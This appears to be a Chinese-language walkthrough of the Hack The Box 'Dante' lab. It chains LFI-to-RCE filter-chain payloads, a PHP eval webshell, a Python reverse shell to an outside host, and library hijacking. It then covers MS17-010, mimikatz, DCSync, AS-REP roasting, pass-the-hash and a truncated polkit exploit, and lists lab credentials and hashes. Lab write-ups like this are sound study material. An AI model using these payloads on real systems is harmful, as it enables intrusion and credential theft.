+ <font style="color:rgb(15, 17, 21);">两个 Linux Samba 服务器都接受 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">administrator:pass@123</font>`<font style="color:rgb(15, 17, 21);"> 和 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">james:Toyota</font>`<font style="color:rgb(15, 17, 21);"> 作为 Guest 用户（无实际权限），但我们可以尝试访问共享。</font>



<font style="color:rgb(15, 17, 21);">访问 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">172.16.1.10</font>`<font style="color:rgb(15, 17, 21);"> 的 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">SlackMigration</font>`<font style="color:rgb(15, 17, 21);"> 共享</font>

```plain
proxychains smbclient //172.16.1.10/SlackMigration -U james%Toyota -c 'ls'

proxychains smbclient //172.16.1.17/forensics -U administrator%pass@123 -c 'ls'
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-019.png)  
<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-020.png)

分别发现admintasks.txt，monitor

下载下来：

```plain
proxychains smbclient //172.16.1.10/SlackMigration -U james%Toyota -c 'get admintasks.txt'

proxychains smbclient //172.16.1.17/forensics -U administrator%pass@123 -c 'get monitor'
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-021.png)

1. **<font style="color:rgb(15, 17, 21);">从 Web 根目录移除 WordPress 安装</font>**<font style="color:rgb(15, 17, 21);"> —— 待处理</font>
2. **<font style="color:rgb(15, 17, 21);">恢复 Ubuntu 机器上的 Slack 集成</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">—— 待处理</font>
3. **<font style="color:rgb(15, 17, 21);">移除旧员工账户</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">—— 已完成</font>
4. **<font style="color:rgb(15, 17, 21);">通知 Margaret 新的变更</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">—— 已完成</font>
5. **<font style="color:rgb(15, 17, 21);">移除 Margaret 账户在晋升为管理员后的权限限制</font>**<font style="color:rgb(15, 17, 21);"> —— 待处理</font>

**<font style="color:rgb(15, 17, 21);">说明：</font>****<font style="color:rgb(15, 17, 21);">存在共享 </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">SlackMigration</font>**`**<font style="color:rgb(15, 17, 21);">与Slack有关，Margaret 账户 已被提升为管理员</font>**

<font style="color:rgb(15, 17, 21);">monitor文件用wireshark打开</font>

发现用户名密码

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-022.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-023.png)

+ <font style="color:rgb(52, 52, 60);">admin/password6543</font>
+ <font style="color:rgb(52, 52, 60);">admin/Password6543</font>

之前的**<font style="color:rgb(15, 17, 21);">其他站点</font>****存在****<font style="color:rgb(15, 17, 21);">本地文件包含（LFI）漏洞还没用</font>**

## <font style="color:rgb(42, 42, 42);">Linux: 172.16.1.10</font>
挂代理访问 [http://172.16.1.10/](http://172.16.1.10/),存在文件包含

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-024.png)  
 <!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-025.png)

<font style="color:rgb(15, 17, 21);">路径穿越拿到etc/passwd</font>

<font style="color:rgb(15, 17, 21);">发现两个关键用户：</font>

+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">frank</font>**`<font style="color:rgb(15, 17, 21);">（普通用户，bash）</font>
+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">margaret</font>**`<font style="color:rgb(15, 17, 21);">（高权限）</font>

<font style="color:rgb(15, 17, 21);">margaret目录可直接访问，有flag</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-026.png)

flag4：DANTE{LF1_M@K3s_u5_lol} 



文件包含读到源码

```plain
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
```

```plain
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
```

<font style="color:rgb(15, 17, 21);"> 现在是要拿shell，尝试</font>**<font style="color:rgb(15, 17, 21);">文件包含转rce,</font>**<font style="color:rgb(15, 17, 21);">常见的方法都试了，不太行</font>

<font style="color:rgb(52, 52, 60);"> 利用文件包含转rce的工具</font>**<font style="color:rgb(52, 52, 60);">filter chain </font>**

<font style="color:rgb(15, 17, 21);"> 生成一个执行系统命令的 webshell  </font>

```plain
python3 php_filter_chain_generator.py --chain '<?php system($_POST["0"]); ?>'
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-027.png)

```plain
proxychains curl -X POST "http://172.16.1.10/nav.php?page=你的filter_chain/resource=php://temp" -d "0=id"
```

<font style="color:rgb(15, 17, 21);">但是没回显，将命令执行结果写入文件</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-028.png)

<font style="color:rgb(15, 17, 21);">可以，那就写入shell</font>

```plain
# 生成一句话木马 base64：PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7ID8+
PAYLOAD=$(python3 php_filter_chain_generator.py --chain '<?php file_put_contents("/var/www/html/shell.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7ID8+")); ?>' | tail -1)

# 写入
proxychains curl -s -X POST "http://172.16.1.10/nav.php?page=$PAYLOAD" -d "0=echo '<?php eval(\\$\_POST\[pass\]);?>' > /var/www/html/shell.php"

# 验证
proxychains curl -s -X POST "http://172.16.1.10/shell.php" -d "pass=phpinfo();" | head -10
```

<font style="color:rgb(15, 17, 21);">但是payload太长了，不行，回显写文件里</font>

当前目录

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-029.png)

wordpress目录

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-030.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-031.png)

想看wp-config.php，直接读不行，用文件包含读

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-032.png)

<font style="color:rgb(15, 17, 21);">解码：</font>

```plain
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

<font style="color:rgb(15, 17, 21);">找到高权限用户</font>**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">margaret</font>**<font style="color:rgb(15, 17, 21);">的密码 Welcome1!2@3#  </font>

<font style="color:rgb(15, 17, 21);">接下来：反弹 shell → su margaret → 提权</font>

<font style="color:rgb(15, 17, 21);">之前 bash 反弹没反应，换 </font>**python 反弹**<font style="color:rgb(15, 17, 21);">，靶机肯定有 python：</font>

<font style="color:rgb(15, 17, 21);">开监听</font>

```plain
nc -lvnp 8888
```

<font style="color:rgb(15, 17, 21);">执行 python 反弹</font>

```plain
PAYLOAD=$(python3 php_filter_chain_generator.py --chain '<?php system($_POST[0]);?>' | tail -1)
```

```plain
proxychains curl -s -X POST "http://172.16.1.10/nav.php?page=$PAYLOAD" -d "0=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.59\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &"
```

<font style="color:rgb(15, 17, 21);">拿到 shell 后切换 margaret</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-033.png)

```plain
# 先升级交互 shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z 挂起，然后输入：
stty raw -echo; fg
# 回车两次

# 切换 margaret
su margaret
# 密码：Welcome1!2@3#
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-034.png)

<font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">受限 shell，用 vim 直接逃逸</font>**<font style="color:rgb(15, 17, 21);">  </font>

<font style="color:rgb(52, 52, 60);">先进入 vim，然后设置 shell 为 sh</font>

```plain
第 1 步：在 margaret 的受限 shell 里输入：
vim
回车，进入 vim。
第 2 步：按一下 **Esc** 键（确保不在输入模式）。
第 3 步：输入冒号 :，你会看到底部出现 `:` 提示符，然后输入：
set shell=/bin/sh
回车。
第 4 步*：再按冒号:`，输入 shell
回车。
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-035.png)

但是这个flag之前已经拿到了

发现slack

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-036.png)

之前的待办提示：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-037.png)

<font style="color:rgb(42, 42, 42);">想利用Slack</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-038.png)

有frank目录，没有权限，要提全

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-039.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-040.png)

有提权脚本

:::info
 Python 库劫持  ：

**原理**：Python 导入模块时，搜索顺序是：

1. **当前目录**（脚本所在目录 / 执行时的工作目录）
2. PYTHONPATH 环境变量指定的目录
3. 标准库目录

如果我们在**优先搜索路径**里放一个同名的恶意 `urllib.py` 或 `call.py`，脚本就会加载我们的恶意代码，并且以 **root 权限**执行。

:::

但是当前用户是 margaret  没权限写

信息收集，找到frank的下载文件

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-041.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-042.png)

在<font style="color:rgb(52, 52, 60);"> secure/2020-05-18.json中找到密码frank/69F15HST1CX，但是有加密，再原始路径找到</font>

```plain
cat ~/.config/Slack/exported_data/secure/2020-05-18.json
```

<font style="color:rgb(52, 52, 60);">frank 密码 TractorHeadtorchDeskmat</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-043.png)

验证

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-044.png)

用frank身份写恶意 `urllib.py`

在 frank 的 shell 里执行：

```plain
echo 'import os; os.system("chmod u+s /bin/bash")' > /home/frank/urllib.py
```

验证写进去了

```plain
ls -la /home/frank/urllib.py
cat /home/frank/urllib.py
```

然后等 cron 任务执行后检查：

```plain
ls -la /bin/bash
```

如果权限变成 `-rwsr-xr-x`

提权 root

```plain
bash -p
id
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-045.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-046.png)

flag5：DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}



当前是在172.16.1.10 是DANTE-NIX02

之前fscan

## <font style="color:rgb(15, 17, 21);">Linux:172.16.1.17</font>
| <font style="color:rgb(15, 17, 21);">172.16.1.17</font> | <font style="color:rgb(15, 17, 21);">DANTE-NIX03</font> | <font style="color:rgb(15, 17, 21);">80, 139, 445, 10000</font> | <font style="color:rgb(15, 17, 21);">SMB 认证成功</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">administrator:P@ssword123</font>`<br/><font style="color:rgb(15, 17, 21);">，运行 Webmin</font> |
| --- | --- | --- | --- |


[http://172.16.1.17:10000/](http://172.16.1.17:10000/)  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-047.png)

172.16.1.17:80

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-048.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-049.png)

```plain
#!/usr/bin/perl
# Display all Webmin modules visible to the current user

BEGIN { push(@INC, "."); };
use WebminCore;

&init_config();
&ReadParse();
$hostname = &get_display_hostname();
$ver = &get_webmin_version();
&get_miniserv_config(\%miniserv);
if ($gconfig{'real_os_type'}) {
	if ($gconfig{'os_version'} eq "*") {
		$ostr = $gconfig{'real_os_type'};
		}
	else {
		$ostr = "$gconfig{'real_os_type'} $gconfig{'real_os_version'}";
		}
	}
else {
	$ostr = "$gconfig{'os_type'} $gconfig{'os_version'}";
	}
%access = &get_module_acl();

# Build a list of all modules
@modules = &get_visible_module_infos();

if (!defined($in{'cat'})) {
	# Maybe redirect to some module after login
	local $goto = &get_goto_module(\@modules);
	if ($goto) {
		&redirect($goto->{'dir'}.'/');
		exit;
		}
	}

$gconfig{'sysinfo'} = 0 if ($gconfig{'sysinfo'} == 1);

if ($gconfig{'texttitles'}) {
	@args = ( $text{'main_title2'}, undef );
	}
else {
	@args = ( $gconfig{'nohostname'} ? $text{'main_title2'} :
		    &text('main_title', $ver, $hostname, $ostr),
		  "images/webmin-blue.png" );
	if ($gconfig{'showlogin'}) {
		$args[0] = $remote_user." : ".$args[0];
		}
	}
&header(@args, undef, undef, 1, 1,
	$tconfig{'brand'} ? 
	"<a href=$tconfig{'brand_url'}>$tconfig{'brand'}</a>" :
	$gconfig{'brand'} ? 
	"<a href=$gconfig{'brand_url'}>$gconfig{'brand'}</a>" :
	"<a href=http://www.webmin.com/>$text{'main_homepage'}</a>"
	);
print "<center><font size=+1>",
    &text('main_version', $ver, $hostname, $ostr),"</font></center>\n"
	if (!$gconfig{'nohostname'});
print "<hr id='header_hr'><p>\n";

print $text{'main_header'};

if (!@modules) {
	# use has no modules!
	print "<p class='main_none'><b>$text{'main_none'}</b><p>\n";
	}
elsif ($gconfig{"notabs_${base_remote_user}"} == 2 ||
    $gconfig{"notabs_${base_remote_user}"} == 0 && $gconfig{'notabs'}) {
	# Generate main menu with all modules on one page
	print "<center><table id='mods' cellpadding=5 cellspacing=0 width=100%>\n";
	$pos = 0;
	$cols = $gconfig{'nocols'} ? $gconfig{'nocols'} : 4;
	$per = 100.0 / $cols;
	foreach $m (@modules) {
		if ($pos % $cols == 0) { print "<tr $cb>\n"; }
		print "<td valign=top align=center width=$per\%>\n";
		local $idx = $m->{'index_link'};
		print "<table border><tr><td><a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>",
		      "<img src=$m->{'dir'}/images/icon.gif border=0 ",
		      "width=48 height=48></a></td></tr></table>\n";
		print "<a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>$m->{'desc'}</a></td>\n";
		if ($pos % $cols == $cols - 1) { print "</tr>\n"; }
		$pos++;
		}
	print "</table></center><p><hr id='mods_hr'>\n";
	}
else {
	# Display under categorised tabs
	&ReadParse();
	%cats = &list_categories(\@modules);
	@cats = sort { $b cmp $a } keys %cats;
	$cats = @cats;
	$per = $cats ? 100.0 / $cats : 100;
	if (!defined($in{'cat'})) {
		# Use default category
		if (defined($gconfig{'deftab'}) &&
		    &indexof($gconfig{'deftab'}, @cats) >= 0) {
			$in{'cat'} = $gconfig{'deftab'};
			}
		else {
			$in{'cat'} = $cats[0];
			}
		}
	elsif (!$cats{$in{'cat'}}) {
		$in{'cat'} = "";
		}
	print "<table id='cattabs' border=0 cellpadding=0 cellspacing=0 height=20><tr>\n";
	$usercol = defined($gconfig{'cs_header'}) ||
		   defined($gconfig{'cs_table'}) ||
		   defined($gconfig{'cs_page'});
	foreach $c (@cats) {
		$t = $cats{$c};
		if ($in{'cat'} eq $c) {
			print "<td class='usercoll' valign=top $cb>", $usercol ? "<br>" :
			  "<img src=images/lc2.gif alt=\"\">","</td>\n";
			print "<td class='usercolc' id='selectedcat' $cb>&nbsp;<b>$t</b>&nbsp;</td>\n";
			print "<td class='usercolr' valign=top $cb>", $usercol ? "<br>" :
			  "<img src=images/rc2.gif alt=\"\">","</td>\n";
			}
		else {
			print "<td class='usercoll' valign=top $tb>", $usercol ? "<br>" :
			  "<img src=images/lc1.gif alt=\"\">","</td>\n";
			print "<td class='usercolc' $tb>&nbsp;",
			      "<a href=$gconfig{'webprefix'}/?cat=$c><b>$t</b></a>&nbsp;</td>\n";
			print "<td class='usercolr' valign=top $tb>", $usercol ? "<br>" :
			  "<img src=images/rc1.gif alt=\"\">","</td>\n";
			}
		print "<td width=10></td>\n";
		}
	print "</tr></table> <table id='mods' border=0 cellpadding=0 cellspacing=0 ",
              "width=100% $cb>\n";
	print "<tr><td><table width=100% cellpadding=5>\n";

	# Display the modules in this category
	$pos = 0;
	$cols = $gconfig{'nocols'} ? $gconfig{'nocols'} : 4;
	$per = 100.0 / $cols;
	foreach $m (@modules) {
		next if ($m->{'category'} ne $in{'cat'});

		if ($pos % $cols == 0) { print "<tr>\n"; }
		local $idx = $m->{'index_link'};
		print "<td valign=top align=center width=$per\%>\n";
		print "<table border bgcolor=#ffffff><tr><td><a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>",
		      "<img src=$m->{'dir'}/images/icon.gif alt=\"\" border=0></a>",
		      "</td></tr></table>\n";
		print "<a href=$gconfig{'webprefix'}/$m->{'dir'}/$idx>$m->{'desc'}</a></td>\n";
		if ($pos++ % $cols == $cols - 1) { print "</tr>\n"; }
		}
	while($pos++ % $cols) {
		print "<td width=$per\%></td>\n";
		}
	print "</table></td></tr></table><p><hr id='mods_hr'>\n";
	}

# Check for incorrect OS
if (&foreign_check("webmin")) {
	&foreign_require("webmin", "webmin-lib.pl");
	&webmin::show_webmin_notifications();
	}

if ($miniserv{'logout'} &&
    !$ENV{'SSL_USER'} && !$ENV{'LOCAL_USER'} && !$ENV{'ANONYMOUS_USER'} &&
    $ENV{'HTTP_USER_AGENT'} !~ /webmin/i) {
	print "<table id='altlogout' width=100% cellpadding=0 cellspacing=0><tr>\n";
	if ($main::session_id) {
		print "<td align=right><a href='session_login.cgi?logout=1'>",
		      "$text{'main_logout'}</a></td>\n";
		}
	else {
		print "<td align=right><a href=switch_user.cgi>",
		      "$text{'main_switch'}</a></td>\n";
		}
	print "</tr></table>\n";
	}

print $text{'main_footer'};
&footer();


```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-023.png?x-oss-process=image%2Fformat%2Cwebp)

之前wireshack找到一个[http://172.16.1.17:10000/](http://172.16.1.17:10000/)  的密码，登录

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-051.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-052.png) 

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-053.png)

flag6：DANTE{SH4RKS_4R3_3V3RYWHERE}

##  Windows DC01 域控 :172.16.1.20
fscan ：<font style="color:rgb(15, 17, 21);">发现漏洞 172.16.1.20 MS17-010</font>

<font style="color:rgb(15, 17, 21);">因为代理，所以 bind_tcp 正向 payload  </font>

```plain
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.20
set RPORT 445
set PAYLOAD windows/meterpreter/bind_tcp
set LPORT 4444
set Proxies socks5:127.0.0.1:1080
run

shell
```

拿下DC01

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-054.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-055.png)

flag6:DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}



下载employee_backup.xlsx

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-056.png)

```plain
用户名	  密码
asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789
```

查看本地用户

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-057.png)

<font style="background-color:#FBDE28;">用户注释</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-058.png)

mrb3n : S3kur1ty2020!

flag7:DANTE{1_jusT_c@nt_st0p_d0ing_th1s}



fscan 扫2段

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-059.png)

发现二级域控172.16.2.5 DANTE-DC02

## Windows DC02:172.16.2.5
拿 域管 NTLM hash  

 直接用 meterpreter 的 kiwi 模块抓  <font style="background-color:#FBDE28;"></font>

```plain
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```

+ **本地 Administrator NTLM**：`9bff06fe611486579fb74037890fda96`
+ **DefaultPassword**：`DishonestSupermanDiablo5679`
+ **域名**：`DANTE.local`

```plain
kiwi_cmd lsadump::dcsync /domain:DANTE.local /user:krbtgt
```

+ **krbtgt NTLM**：`49e6f37ede481d09747f6a0c9abcbaa7`
+ **域 SID**：`S-1-5-21-2273245918-2602599687-2649756301`

黄金票据：

生成黄金票据并注入内存

```plain
kiwi_cmd kerberos::golden /user:Administrator /domain:DANTE.local /sid:S-1-5-21-2273245918-2602599687-2649756301 /krbtgt:49e6f37ede481d09747f6a0c9abcbaa7 /ptt
```

不行

之前的代理是挂在入口机上，现在在DC01上挂一个代理

```plain
Kali → 1080(socks入口) → 入口机 → 172.16.1.0/24 → DC01 → 172.16.2.0/24
```

利用msf的多级代理：

```plain
sessions -l
# 1. 进 DC01 的 session 加路由
sessions -i <DC01的sessionID>
run autoroute -s 172.16.2.0/24
background

# 2. 起 socks 代理
use auxiliary/server/socks_proxy
set SRVPORT 1081
run -j

# 3. proxychains 配置加 1081
# /etc/proxychains4.conf 最后一行改成 socks5 127.0.0.1 1081

# 4. 直接扫
proxychains nmap -sT -Pn 172.16.2.5 -p 21,22,80,88,135,139,389,443,445,5985,3389

```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-060.png)

** **现在要横道DC02上，但是没有对的用户名和密码

**<font style="background-color:#FBDE28;">Kerbrute 枚举有效域用户</font>****  **

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-061.png)

域名DANTE.ADMIN（所以之前的黄金票据不对）

用已知用用户名密码哈希碰撞

```plain
proxychains impacket-GetNPUsers DANTE.ADMIN/ -dc-ip 172.16.2.5 -usersfile users.txt -format hashcat -outputfile asrep.hash
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-062.png)

```plain
$krb5asrep$23$jbercov@DANTE.ADMIN:96b2deaa8922c816b32a9b6cd1ca6c86$a8d65b6eb5543f9be68a7a652d30ac5f398c58920c22ab0048a4b9462a26d11fb8e021d36b5f77e6080576542d9b73f626de6c716bc761e3cba7f7600860e522d58ea8a5252dbc7eae0dfd2608bd35a5fc85e060b2fdf2f6121812e9fd3e4ad12cce0083bfd2a5471a7589807d67a6c5c6c26f1b913ac3b628353e6eda1705d53e16a1350c8f15fe94fa44945a76aad0bb12919e1eb753507d62c6ab3fed4c0ed315e5649e89f8573815e3d09ac599d4a7006f490c8298aca99b64b837b0c952a58bd1948277fa2df8dd7c9c0a32a25e98b9b800c53eec56ac224c75db4a2263485668f1f94453473754
```

爆破哈希：

```plain
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

jbercov ： myspace7  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-063.png)

用 WinRM 登录 DC02

```plain
proxychains evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-064.png)

但是，msf的代理很不稳定，老是断

重挂一个frp

```plain
Kali(frps服务端) ← DC01(frpc客户端) ← 二级网段 172.16.2.0/24
```

```plain
evil-winrm -i 127.0.0.1 -P 5985 -u jbercov -p myspace7
```

type C:\Users\jbercov\Desktop\flag.txt

flag8:DANTE{Im_too_hot_Im_K3rb3r045TinG!}

提权

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-065.png)

没找到什么有用信息



fscan：

还有一台172.16.2.101

SharpHound看拓扑：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-066.png)

符合 DCSync 权限  ：****

+ `GetChanges`
+ `GetChangesInFilteredSet`
+ `GetChangesAll`

**说明：**

jbercov 这个账号可以：

+ 假装自己是域控
+ 向真域控请求复制所有用户的密码哈希
+ 不用登录域控，不用提权，直接 dump 整个域的所有账号密码

找了一个利用工具 DSInternals.psd1  ，试试

```plain
上传完整的 zip
upload /home/echoin/桌面/DSInternals_v7.1.zip
解压
Expand-Archive -Path .\DSInternals_v7.1.zip -DestinationPath .\DSInternals -Force
进到目录里导入
cd .\DSInternals
dir
Import-Module .\DSInternals.psd1
导入成功后直接 dump 哈希
Get-ADReplAccount -SamAccountName Administrator -Server 127.0.0.1 -NamingContext "DC=DANTE,DC=ADMIN"
```

不行，卡最后一步了

mimikaze：

```plain
.\mimikatz.exe "lsadump::dcsync /domain:DANTE.ADMIN /user:Administrator" "exit"
```

+ **Administrator NTLM**: `4c827b7074e99eefd49d05872185f7f8`
+ **域 SID**: `S-1-5-21-1107894465-4119991344-1603665553`

拿到hash了，用哈希登录

直接用 **evil-winrm PTH 登录**

5985 端口 frp 已经转发到本地 5985 了：

```plain
evil-winrm -i 127.0.0.1 -P 5985 -u Administrator -H 4c827b7074e99eefd49d05872185f7f8
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-067.png)

flag9：DANTE{DC_or_Marvel?}

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-068.png)

> Note：
>
> 你本应通过枚举 DC01 上的浏览器历史文件来发现这个子网。
>
> 172.16.1.10（NIX02）也可以作为跳板打到这台机子，它可能比 DC01 更稳定一些。
>
> （确实）
>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-069.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-070.png)

Jenkins.bat文件发现一组用户名密码： Admin_129834765 SamsungOctober102030

## <font style="color:#DF2A3F;">Linux:172.16.2.101</font>
有22端口

<font style="color:rgb(42, 42, 42);">SSH 爆破   </font><font style="color:rgb(52, 52, 60);">msf</font>

<font style="color:#DF2A3F;background-color:#FBDE28;">julian:manchesterunited（找半天都不知道是哪来的，看wp后来才知道是之前拿的员工表有问题）</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-071.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-dante-072.png)

/home/julian/flag.txt：

flag10：DANTE{H1ding_1n_th3_c0rner}

<font style="color:rgb(52, 52, 60);">linPEAS :CVE-2021-3560 (Polkit)</font>

```plain
# 1. 创建sudo组用户privesc（利用CVE-2021-3560 polkit竞态条件）
# int32:1 = administrator类型 → 自动加入sudo组
dbus-send --system --dest=org.freedesktop.Accounts \
  --type=method_call --print-reply \
  /org/freedesktop/Accounts \
  org.freedesktop.Accounts.CreateUser \
  string:privesc string:"PrivEsc User" int32:1 &
sleep 0.005
kill $! 2>/dev/null
# 验证创建成功
id privesc
# uid=1000(privesc) gid=1000(privesc) groups=1000(privesc),27(sudo)
# 2. 通过CVE-2021-3560设空密码
python3 -c "
import subprocess, time, os
